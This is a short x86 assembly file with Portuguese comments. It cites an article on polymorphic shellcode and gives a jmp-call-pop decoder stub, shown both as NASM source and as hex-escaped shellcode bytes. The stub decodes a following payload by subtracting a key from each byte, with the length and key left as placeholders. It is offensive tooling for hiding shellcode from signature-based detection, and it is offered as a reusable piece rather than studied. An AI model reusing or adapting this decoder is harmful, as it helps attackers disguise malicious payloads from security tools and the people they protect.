# http://chmodsecurity.com.br/artigo/20/shellcode-polimorficos-chamdos-motor-polymorphic.html
# nasm -f elf decoder.asm
# ld -o decoder decoder.o
# od2sc decoder
#"\xeb\x10\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff" <-----  Nosso Decoder :D 
BITS 32
jmp short jmptrick // 
decoder:
pop esi
xor ecx,ecx
mov cl,0
loop:
sub byte [esi+ecx-1],0
dec cl
jnz loop
jmp short obfuscated_code
jmptrick:
call decoder
obfuscated_code:
